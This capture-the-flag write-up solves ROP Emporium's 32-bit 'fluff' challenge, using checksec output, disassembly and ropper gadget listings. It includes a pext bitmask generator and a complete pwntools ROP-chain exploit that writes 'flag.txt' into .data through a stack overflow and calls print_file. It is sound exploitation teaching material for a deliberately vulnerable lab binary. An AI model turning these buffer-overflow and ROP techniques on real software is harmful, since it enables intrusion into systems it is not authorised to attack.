# fluff - 32 Bit
Program execution:
```
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> <input_here>
```
Run checksec: `checksec ./fluff32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
```
Again, `main` call `pwnme`, which is defined in the given libfluff32.so.

Disassembling libfluff32.so shows that `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `ebp-0x28`:
```assembly
00000724  push    0x200 {var_34}
00000729  lea     eax, [ebp-0x28 {var_2c}]
0000072c  push    eax {var_2c} {var_38}
0000072d  push    0x0
0000072f  call    read
```

Like in the last challenge, there is a `print_file` function which will print a file specified by the string argument (filename string address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z fluff32` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000005e0 0x080485e0 11  12   .rodata ascii nonexistent
```
Let's find a writeable area of memory, where we can write our "flag.txt" string.
`readelf -S fluff32`:
```
There are 30 section headers, starting at offset 0x17a8:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008a 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048322 000322 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048338 000338 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048358 000358 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048360 000360 000018 08  AI  5  23  4
  [11] .init             PROGBITS        08048378 000378 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001d2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485c4 0005c4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485ec 0005ec 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048630 000630 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000216 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 0016a2 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

So we know we need to write "flag.txt" to .data, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation), ideally. First let's see what `mov` gadgets we get to work with at all.
`ropper -f fluff32 --search 'mov'`:
```
[INFO] File: fluff32
0x080484e7: mov al, byte ptr [0xc9010804]; ret;
0x0804846d: mov al, byte ptr [0xd0ff0804]; add esp, 0x10; leave; ret;
0x080484ba: mov al, byte ptr [0xd2ff0804]; add esp, 0x10; leave; ret;
0x080484e4: mov byte ptr [0x804a020], 1; leave; ret;
0x0804854f: mov eax, 0xdeadbeef; ret;
0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
0x080484b2: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a020; call edx;
0x08048466: mov ebp, esp; sub esp, 0x14; push 0x804a020; call eax;
0x080484da: mov ebp, esp; sub esp, 8; call 0x450; mov byte ptr [0x804a020], 1; leave; ret;
0x08048545: mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
0x08048423: mov ebx, dword ptr [esp]; ret;
0x0804837d: mov edi, 0x81000000; ret;
0x08048548: mov edx, 0x62e2c4b0; cmc; sar byte ptr [eax - 0x21524111], 1; ret;
0x0804847a: mov esp, 0x27; add bl, dh; ret;
```
Not a whole lot to work with here, so let's see what's in the hinted `questionableGadgets` function:
`objdump -d -Mintel fluff32 | grep questionableGadgets -A 13`:
```
08048543 <questionableGadgets>:
 8048543:       89 e8                   mov    eax,ebp
 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa
 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax
 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef
 8048554:       c3                      ret
 8048555:       86 11                   xchg   BYTE PTR [ecx],dl
 8048557:       c3                      ret
 8048558:       59                      pop    ecx
 8048559:       0f c9                   bswap  ecx
 804855b:       c3                      ret
 804855c:       66 90                   xchg   ax,ax
 804855e:       66 90                   xchg   ax,ax
```
Some weird gadgets but this might just be enough for us to work with. Gadget `8048555` is an `xchg` which will let us swap data between operands. This is how we can write to `.data`. But we'll need to get our `.data` address into `ecx` first.

Luckily we have gadget `8048558` which will let us load data into `ecx` before switching endianness with `bswap`. So we just need to add the address in our payload in big-endian form - no big deal.

The gadget starting from `8048543` is a bit more complex. The `pext` instruction will essentially use `eax` (loaded from `ebp` beforehand) as a bitmask, to pick bits from `ebx` (`0xb0bababa`) similarly to a bitwise `AND` **however**, the chosen bits get loaded into `edx` in **contiguous order**. So if the mask had 20 "1 bits", then the 20 least significant bits of `edx` would be loaded with the corresponding bits from `ebx`, and the 12 more significant bits would be zeros.

Now we just need a gadget to get controlled data into `ebp`.
`ropper -f fluff32 --search 'pop ebp'`:
```
[INFO] File: fluff32
0x08048525: pop ebp; lea esp, [ecx - 4]; ret;
0x080485bb: pop ebp; ret;
```

Now we know what to do, the hardest part is that we need to generate some bitmask that gets loaded into `ebp`/`eax` which has 8 bits set that will extract the correct bits from `0xb0bababa` during the `pext` instruction so we can retrieve the correct characters to build up our "flag.txt" string.

I made the following function to generate this mask:
```python
BITS_IN_CHAR = 8
BITS_IN_32BIT_REG = 32
# "c" is an 8 bit character
# "data" is a 32 bit integer (0xb0bababa will be the arg)
def generate_mask(c, data):
    c = ord(c)
    mask = 0 # our resulting mask to be generated
    # c_i is index for character bit from the lsb side
    # d_i is index for the data bit from the lsb side
    c_i = d_i = 0

    # we will only need to set 8 mask bits to 1s, for each
    # bit in the char.
    # for safety our loop also shouldn't run beyond
    # the length of a 32 bit integer
    while c_i < BITS_IN_CHAR and d_i < BITS_IN_32BIT_REG:
        # generate some temp masks for the current bit
        # in our char and data.
        c_bit = 1 << c_i
        d_bit = 1 << d_i

        # we will only set 8 mask bits, for each bit
        # of the character.
        # this will be whenever we find a char bit
        # matching the data bit (both 1s or both 0s),
        # because we know that whenever we encounter this 
        # bit in the data, we want to keep it as part of
        # the final char output of `pext`

        if (c & c_bit) and (data & d_bit):
            mask |= d_bit
            c_i += 1
        elif not ((c & c_bit) or (data & d_bit)):
            mask |= d_bit
            c_i += 1
        d_i += 1

    return mask
```

Final exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./fluff32"
p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
    gdb.attach(p, '''break main''')

CONST = 0xb0bababa
BITS_IN_CHAR = 8
BITS_IN_32BIT_REG = 32

data_addr = 0x0804a018
pop_bswap_ecx_addr = 0x08048558     # pop ecx; bswap ecx; ret;
pop_ebp_addr = 0x080485bb           # pop ebp; ret;
mov_ebp_pext_addr = 0x08048543      # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
xchg_ptr_ecx_dl_addr = 0x08048555   # xchg BYTE PTR [ecx], dl; ret;

# generates a mask such that when it is used for a `pext`
# instruction on the data, we get the original character back
# "c" is an 8 bit character
# "data" is a 32 bit integer
def generate_mask(c, data):
    c = ord(c)
    mask = 0
    c_i = d_i = 0

    while c_i < BITS_IN_CHAR and d_i < BITS_IN_32BIT_REG:
        c_bit = 1 << c_i
        d_bit = 1 << d_i

        # we will only set 8 mask bits, for each bit
        # of the character.
        # this will be whenever we find a char bit
        # matching the data bit (both 1s or both 0s),
        # because we know that whenever we encounter this 
        # bit in the data, we want to keep it as part of
        # the final char output of `pext`

        if (c & c_bit) and (data & d_bit):
            mask |= d_bit
            c_i += 1
        elif not ((c & c_bit) or (data & d_bit)):
            mask |= d_bit
            c_i += 1
        d_i += 1

    return mask

p.recvuntil(b'> ')
payload = b'A' * (0x28 + 0x4)

for i, c in enumerate('flag.txt'):
    # build our string, 1 char at a time
    payload += p32(pop_bswap_ecx_addr)
    payload += p32(data_addr+i, endian='big')
    payload += p32(pop_ebp_addr)
    payload += p32(generate_mask(c, CONST))
    payload += p32(mov_ebp_pext_addr)
    payload += p32(xchg_ptr_ecx_dl_addr)

# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)
p.interactive()

```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```